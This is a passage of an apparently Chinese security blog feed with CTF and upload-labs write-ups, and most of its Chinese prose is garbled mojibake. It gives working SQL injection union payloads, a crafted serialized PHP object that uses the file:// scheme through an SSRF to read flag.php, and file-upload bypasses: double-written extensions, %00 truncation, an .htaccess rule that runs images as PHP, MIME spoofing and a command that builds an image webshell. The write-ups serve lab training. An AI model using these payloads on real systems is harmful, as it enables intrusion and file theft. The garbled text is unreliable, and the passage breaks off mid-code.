¼ã€‚è¿™é‡Œè¿˜å‡ºç°ä¸€ä¸ªæç¤º</p><p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> æç¤ºå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç»§ç»­çˆ†è¡¨ã€‚</p><p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p><p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p><p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p><p>çˆ†å‡ºä¸€å¤§å †åˆ—åã€‚ç›´æ¥è¯»å–dataçš„å†…å®¹</p><p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p><p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p><p>å‘ç°å†…å®¹æ˜¯æ³¨å†Œæ—¶ä¿¡æ¯ä¿å­˜ä¸ºåºåˆ—åŒ–å†…å®¹</p><p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€sunzyâ€;s:3:â€ageâ€;i:22;s:4:â€blogâ€;s:12:â€22.github.ioâ€;}</p><p>åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ã€‚ã€‚ã€‚</p><h2 id="0x02å®¡è®¡æºç "><a href="#0x02å®¡è®¡æºç " class="headerlink" title="0x02å®¡è®¡æºç "></a>0x02å®¡è®¡æºç </h2><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™å‡ºæ¥äº†æºç å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„</p><p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p><p>æºç </p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>ä¿¡æ¯ç±»</span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // å¤„ç†<span class="hljs-title">url</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$ch</span> = curl_init();    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;    &#125;    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);&#125;&#125;</code></pre><p>å®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚</p><p><strong>æ€è·¯ï¼šåˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚</strong></p><pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre><p>æŸ¥çœ‹æºç ï¼Œè§£base64ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>unserailize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-11-21</title>
    <link href="/2020/09/18/upload2/"/>
    <url>/2020/09/18/upload2/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs-11-21"><a href="#upload-labs-11-21" class="headerlink" title="upload-labs 11-21"></a>upload-labs 11-21</h1><span id="more"></span><h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;                <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p> <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>è¿™æ®µä»£ç æ˜¯å°†æ–‡ä»¶åä¸­å‡ºç°  <code>deny_ext</code>çš„åç¼€åæ›¿æ¢ä¸ºç©º</p><p>å¯ä»¥åŒå†™ç»•è¿‡ï¼Œå³<code>1.pphphp</code></p><h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;    &#125;&#125;</code></pre><p>æœ¬é¢˜ä¸ä¹‹å‰çš„é¢˜ç›®æœ‰æ‰€ä¸åŒï¼Œè¿™é¢˜çš„æ–‡ä»¶çš„ä¿å­˜è·¯å¾„æ˜¯å¯ä»¥æ§åˆ¶çš„</p><p>è¿™é‡Œç”¨çš„<code>%00æˆªæ–­</code>ï¼ŒåŸç†å¦‚ä¸‹</p><p><code>www.xxx.com/qq.jpg</code></p><p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>å…¶åç¼€åä¸º.jpgå¯ä»¥ç»•è¿‡æ£€æµ‹ï¼Œä½†æ˜¯windowsç³»ç»Ÿå¤„ç†æ—¶ä¸ä¼šå¤„ç†%00ä¹‹åçš„å†…å®¹æ•…ä¿å­˜çš„æ–‡ä»¶å°±æ˜¯qq.php</p><p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" alt></p><h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>è¿™é¢˜ä¸ä¸Šé¢˜åˆ©ç”¨çš„åŸç†ç›¸åŒ</p><p>ä½†æ˜¯è¿™é‡Œè¦ä½¿ç”¨ 00çš„äºŒè¿›åˆ¶å½¢å¼</p><p><img src="/2020/09/18/upload2/13.png" alt></p><p><img src="/2020/09/18/upload2/13-1.png" alt></p><h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>æ˜ç¡®è¯´äº†ä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚</span>    fclose(<span class="hljs-variable">$file</span>);    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);        <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;              <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;            <span class="hljs-keyword">break</span>;                <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;            <span class="hljs-keyword">break</span>;        <span class="hljs-keyword">default</span>:                        <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;        &#125;            <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;&#125;</code></pre><p><strong>GIF89a</strong> æ˜¯GIFå›¾ç‰‡çš„æ–‡ä»¶å¤´ ï¼Œæ˜¯ä¸ºäº†ç»•è¿‡gifæ–‡ä»¶çš„æ£€æŸ¥</p><p><strong>å›¾ç‰‡æœ¨é©¬çš„åˆ¶ä½œ</strong></p><p>æ¡Œé¢å»ºç«‹ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°†å…¶æ”¹ä¸º2.jpgï¼Œå†å»ºç«‹ä¸€ä¸ªæ”¹ä¸º1.php,å…¶å†…å®¹ä¸ºä½ æƒ³æ·»åŠ çš„ä¸€å¥è¯æœ¨é©¬</p><p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p><p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p><p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" alt></p><p><strong>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</strong></p>]]></content>
    
    
    <categories>
      
      <category>æ–‡ä»¶ä¸Šä¼ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>åŒå†™ç»•è¿‡</tag>
      
      <tag>00æˆªæ–­</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uploads-labs</title>
    <link href="/2020/09/16/uploads/"/>
    <url>/2020/09/16/uploads/</url>
    
    <content type="html"><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><span id="more"></span><h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>ç›´æ¥æŠ“åŒ…ä¿®æ”¹æ–‡ä»¶åç¼€åä¸ºjpg,png,gifå³å¯</p><h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>æŸ¥çœ‹æºç </p><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre><p>è¿™æ®µä»£ç è¯´æ˜æ˜¯å¯¹æ–‡ä»¶çš„<code>MIME</code>ç±»å‹è¿›è¡Œäº†è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼  1.php æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸º <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,è¿™ä¸‰ä¸ªç±»å‹éƒ½ä¸ºå›¾ç‰‡</p><p>æŠ“åŒ…ä¿®æ”¹MIMEå³å¯</p><p>çŸ¥è¯†ç‚¹è¡¥å……ï¼š</p><p> <strong>MIMEç±»å‹å¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œä½†æ˜¯ä¼ ç»Ÿå†™æ³•éƒ½æ˜¯å°å†™ã€‚</strong> </p><pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain<span class="hljs-built_in">text</span>/htmlimage/jpegimage/pngaudio/mpegaudio/oggaudio/*video/mp4<span class="hljs-built_in">application</span>/*<span class="hljs-built_in">application</span>/json<span class="hljs-built_in">application</span>/javascript<span class="hljs-built_in">application</span>/ecmascript<span class="hljs-built_in">application</span>/octet-stream</code></pre><p>æ›´è¯¦ç»†çš„è§£é‡Šï¼Œ</p><h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre><p>åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡</p><h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>æ–‡ä»¶çš„ä½œç”¨</p><blockquote><ul><li>URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢</li><li>MIMEç±»å‹é…ç½®</li><li>è®¿é—®æƒé™æ§åˆ¶ç­‰</li><li>ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨</li><li>å›¾ç‰‡é˜²ç›—é“¾</li><li>è‡ªå®šä¹‰404é”™è¯¯é¡µé¢</li><li>é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ</li><li>ç›®å½•æµè§ˆä¸ä¸»é¡µ</li><li>ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹</li><li>æ–‡ä»¶å¯†ç ä¿æŠ¤</li></ul></blockquote><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre><p>è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š</p><p>é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ</p><p>æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ</p><p>ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª <code>1.jpg</code>å³å¯</p><h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>                <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;        &#125;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;    &#125;&#125;</code></pre><p>æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜</p><p><img src="/2020/09/16/uploads/5.png" alt></p><h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span 